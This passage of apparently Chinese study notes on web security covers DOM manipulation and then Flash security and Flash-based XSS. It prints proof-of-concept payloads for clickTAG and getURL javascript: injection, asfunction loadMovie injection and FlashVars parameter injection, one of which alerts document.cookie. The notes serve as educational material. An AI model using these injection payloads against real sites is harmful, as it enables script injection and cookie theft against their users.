style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">var div1 =document.getElemnetById(&quot;div1&quot;);//遍历dom</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">document.getElementByname //获得指定name的&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;标签的相关信息</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">doucument.getElementTagName //获得指定的&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;标签相关信息</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dom元素无非两种：文本和元素，使用innerHTML属性就可以从一个元素中提取所有的html和文本。</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> id</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;tr1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">h1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;hello world!&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">h1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">div</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">alert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">getElementById</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;tr1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">innerHTML</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">使用innerHTML方法还可以向HTML DOM中插入新的内容，具体实例如下：</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> href</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;#&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> onclick</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">this</span><span style="--shiki-light:#383A42;--shiki-dark:#98C379;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">innerHTML</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;&lt;h1&gt;this is new message&lt;/h1&gt;&#39;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;old message&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a.beforeBegin //插入到标签开始标记前</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">b.afterBegin //插入到标签开始标记后</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">c.beforeEnd //插入到标签结束标记前</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">d.afterEnd //插入到标签结束标记后</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>dom技术还可获取和设置元素特性的值</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>id(&quot;domid&quot;).getAttribute(&quot;id&quot;); //获取特性</span></span>
<span class="line"><span>tag(&quot;input&quot;)[0].setAttribute(&quot;value&quot;,&quot;your name&quot;); //设置特性的值</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>修改dom的主要方法是使用createElement()函数，该函数可以让用户即刻创建新的元素；</p><p>document.createElenment()能在对象中创建一个对象，通常会与appendChild()或insertBefore()联合使用。appendChild()在节点的子节点列表末添加新的子节点，insertBefore()在节点的子节点列表的任意位置插入新的节点；</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> o</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建链接</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">function</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> creatA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> a</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;"> document</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">createElement</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;a&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建一个&lt;a&gt;元素</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">	a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">href</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">url</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//设定链接的url地址</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">	a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">innerHTML</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//设置名称</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">	a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">style</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">color</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;red&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//设定链接颜色</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">	o</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">appendChild</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">	creatA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;http://uu2fu3o.com/&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;playsec&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">script</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">body</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">html</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>还可以使用javascript方法进行辅助,例如indexOf/substring/lastindexOf</p><p>IndexOf方法：返回String对象内第一次出现子字符串的位置</p><p>substring方法：返回位于String对象中的指定位置的字符串</p><p>function substring(start: number,end : number) :String</p><p>如果start和end为负数，则会替换为0；</p><p><strong>xss蠕虫通常会与csrf形成绑定，造成更加效率的攻击，网络上也有很多实战记录</strong></p><h2 id="_2-10-flash简介" tabindex="-1"><a class="header-anchor" href="#_2-10-flash简介"><span>2.10 Flash简介</span></a></h2><h3 id="_2-10-1-flash和swf" tabindex="-1"><a class="header-anchor" href="#_2-10-1-flash和swf"><span>2.10.1 flash和swf</span></a></h3><p>swf为flash的专属格式，flash player可运行swf文件，swf文件可以直接嵌入到网页中执行</p><h3 id="_2-10-2-嵌入flash文件" tabindex="-1"><a class="header-anchor" href="#_2-10-2-嵌入flash文件"><span>2.10.2 嵌入flash文件</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>(1)使用&lt;embed&gt;标签</span></span>
<span class="line"><span>&lt;html&gt;</span></span>
<span class="line"><span>	&lt;body marginwidth=&quot;0&quot; marginheigth=&quot;0&quot;&gt;</span></span>
<span class="line"><span>		&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; name=&quot;plugin&quot;&gt;</span></span>
<span class="line"><span>		src=&quot;xxx.swf&quot; type=&quot;application/x-shockwave-flash&quot;/&gt;</span></span>
<span class="line"><span>	&lt;/body&gt;</span></span>
<span class="line"><span>&lt;/html&gt;</span></span>
<span class="line"><span>(2)使用&lt;object&gt;标签</span></span>
<span class="line"><span>(3)使用&lt;object&gt;+&lt;embed&gt;标签</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-10-3-actionscript-语言" tabindex="-1"><a class="header-anchor" href="#_2-10-3-actionscript-语言"><span>2.10.3 ActionScript 语言</span></a></h3><p>flash内置的脚本语言-ActionScript,该语言基于javascript,具有类似的语法和结构，但本质上却截然不同，actionscript使用的脚本完全由flash player解释和处理，与查看文件的浏览器无关，而javascript使用的外部解释程序则很具浏览器的不同而不同；</p><h3 id="_2-10-4-flash安全模型" tabindex="-1"><a class="header-anchor" href="#_2-10-4-flash安全模型"><span>2.10.4 flash安全模型</span></a></h3><p><strong>flash sandbox</strong></p><p>安全域是flash中最顶级的沙箱，不同的安全与使得swf文件运行在自身的沙箱下；</p><p>如果连个swf文件位于不同的沙箱下，二者数据不可相互获取；</p><p>如果想让二者进行通讯，可通过信任授权(方法:Security.allow.Domain())来实现。</p><p>Security.allow.Domain(&quot;*&quot;)会为所有域中的swf授权访问；</p><p>非swf格式文件不能调用allowDomain 代码，这类文件由另一种方法Cross Domain Policy文件处理；</p><h3 id="_2-10-5-cross-domain-policy" tabindex="-1"><a class="header-anchor" href="#_2-10-5-cross-domain-policy"><span>2.10.5 CRoss Domain Policy</span></a></h3><p>类似于javascript中的同源策略；</p><figure><img src="/articles/assets/crossdomainpolicy-DUOLmmwC.png" alt="crossdomainpolicy" tabindex="0" loading="lazy"><figcaption>crossdomainpolicy</figcaption></figure><p>唯一能让flash实行跨域请求的是网站根域名下的crossdomain.xml文件</p><p>该文件定义了可被flash player加载的安全网站域名，并限制读取数据的位置i和内容，例如</p><div class="language-xml line-numbers-mode" data-highlighter="shiki" data-ext="xml" data-title="xml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;?</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">xml</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">?&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cross-domain-policy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">allow-access-from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> domain</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;*.target.com&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">allow-access-from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> domain</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;www.test.org&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">allow-access-from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> domain</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;123.202.0.1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">/&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cross-domain-policy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>则该文件允许来自上述三个域名的跨域请求</p><p>除了allow-access-from节点，根节点下还包含另外三个子节点；</p><figure><img src="/articles/assets/crossxmldomain-wROMIoT4.png" alt="crossxmldomain" tabindex="0" loading="lazy"><figcaption>crossxmldomain</figcaption></figure><p>如果设置了permitted-cross-domain-policies的by-content-type相关属性后，黑客就可以上传文件来定义自己的策略文件；</p><h3 id="_2-10-6-设置管理器" tabindex="-1"><a class="header-anchor" href="#_2-10-6-设置管理器"><span>2.10.6 设置管理器</span></a></h3><p>本地flash player自行设置安全域等</p><h2 id="_2-11-flash客户端攻击剖析" tabindex="-1"><a class="header-anchor" href="#_2-11-flash客户端攻击剖析"><span>2.11 Flash客户端攻击剖析</span></a></h2><h3 id="_2-11-1-geturl-xss" tabindex="-1"><a class="header-anchor" href="#_2-11-1-geturl-xss"><span>2.11.1 getURL()&amp;XSS</span></a></h3><p><strong>clickTAG</strong></p><p>该变量用于跟踪广告，提供广告的显示范围，事件点击次数，时间；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>利用&lt;embed&gt;&lt;object&gt;插入广告横幅</span></span>
<span class="line"><span>&lt;embed</span></span>
<span class="line"><span>src=&quot;http://www.test.com/xxxx.swf?clickTAG=http://test.com/track?http://example.com</span></span>
<span class="line"><span>&quot;&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果没有正确检查clickTAG变量，就有可能执行xss</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>例如</span></span>
<span class="line"><span>getURL(clickTAG,&quot;_top&quot;)</span></span>
<span class="line"><span>传入?clickTAG=javascript:alert(/xss/)就可以执行弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>getURL函数的作用将来自特定URL的文档加载到窗口中，或将变量传递到位于所定义的另一个URL的另一个应用程序</p><figure><img src="/articles/assets/getURL-DquQ_Hh_.png" alt="getURL" tabindex="0" loading="lazy"><figcaption>getURL</figcaption></figure><p>如果我们使用javascript来替换，就能得到弹窗</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>getURL(&quot;javascript:alert(document.cookie)&quot;)</span></span>
<span class="line"><span>假设有如下脚本</span></span>
<span class="line"><span>getURL(&quot;javascript:void(0)&quot;,&quot;_self&quot;,&quot;GET&quot;);</span></span>
<span class="line"><span>访问http://xxx.x.x.x/xxx.swf?a=0:0;alert(/xss/);</span></span>
<span class="line"><span>即可触发弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>actionscript3不支持getURL,用actionscript2.0编写即可</p><figure><img src="/articles/assets/flashhighrisk-Bfh7gGis.png" alt="flashhighrisk" tabindex="0" loading="lazy"><figcaption>flashhighrisk</figcaption></figure><h3 id="_2-11-2-cross-site-flashing" tabindex="-1"><a class="header-anchor" href="#_2-11-2-cross-site-flashing"><span>2.11.2 cross site flashing</span></a></h3><p>XSF通常来自两个不同的域，当使用某方法载入另一个swf时，就能获取相同的安全沙箱</p><p>当网页使用*Script去解析一个flash影片时也会产生xsf</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">例如</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">loadMovie(_root.mURL+&#39;/movie2.swf&#39;)//不一定是loadMovie方法</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">访问</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">http://host/foo.swf?mURL=asfunction:getURL,javascript:alert(xss)//</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">结果为</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">loadMovie(&#39;asfunction:getURL,javascript:alert(xss)///movie2.swf&#39;)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">触发弹窗</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="/articles/assets/loadMovie-B5S2O8Lm.png" alt="loadMovie" tabindex="0" loading="lazy"><figcaption>loadMovie</figcaption></figure><p>asfunction伪协议是一个专用于Flash的HTML附加协议，允许用户通过超级链接调用函数或一个带参的函数；</p><h3 id="_2-11-3-flash参数型注入" tabindex="-1"><a class="header-anchor" href="#_2-11-3-flash参数型注入"><span>2.11.3 Flash参数型注入</span></a></h3><p>(1)反射型flash参数注入</p><p>当lfash视频的名称作为url参数暴露在外时，攻击者可以控制装入flash的变量，加载一个恶意flash视频</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>print &#39;&lt;object type=&quot;application/x-shockwave-flash&quot; data =&quot;&#39; . $params{movie}&#39;&quot;&gt;&lt;/object&gt;&#39;</span></span>
<span class="line"><span>传入http://xxx.x.x.x/index.cgi?movie=myMovie.swf?globalVar=e-v-i-l</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>(2)附带FlashVars的反射型注入Flash参数注入</p><p>该方法使用Flash Vars属性，该属性可在**<code>&lt;object&gt;</code>**标签中指定，用来传递全局Flash 参数。AS2.0中，FlashVars会被自动导入到Flash应用程序的变量空间</p><p>(3)FlashVars注入</p><p>当任意的object标签接收参数时都可能导致该种攻击</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>print &#39;&lt;object type=&quot;application/x-shockwave-flash&quot; &#39;.</span></span>
<span class="line"><span>&#39;data=&quot;myMovie.swf&quot;&#39;.</span></span>
<span class="line"><span>&#39;width=&quot;&#39;.$params{width}.</span></span>
<span class="line"><span>&#39;&quot;height=&quot;&#39;.$params{height}.</span></span>
<span class="line"><span>&#39;&quot;&gt;&lt;/object&gt;&#39;;</span></span>
<span class="line"><span>由于width和height没有进行过滤，所以</span></span>
<span class="line"><span>http://xxx.x.x.x/myMovie.cgi?width=600&amp;height=600&quot;flashvars=&quot;globalVar=e-v-i-l</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(4)基于dom的flash参数注入</p><p>当document.location 变量被用作Flash参数时，会导致此类攻击</p><p>(5)持久型flash参数注入</p><p>该类情况发生在Flash Cookie被保存下来并且被加载到Flash视频下的情况</p><p>(6)利用flash进行钓鱼</p><h2 id="_2-12-利用flash-进行xss攻击剖析" tabindex="-1"><a class="header-anchor" href="#_2-12-利用flash-进行xss攻击剖析"><span>2.12 利用Flash 进行XSS攻击剖析</span></a></h2><p>决定性因素：allowScriptAccess属性</p><p>该属性决定了flash是否能够执行脚本代码</p><figure><img src="/articles/assets/allowScriptAccess-B99dO3GV.png" alt="allowScriptAccess" tabindex="0" loading="lazy"><figcaption>allowScriptAccess</figcaption></figure><p>当该属性没有被严格控制时，我们就可以利用flash来执行xss</p><div class="language-html line-numbers-mode" 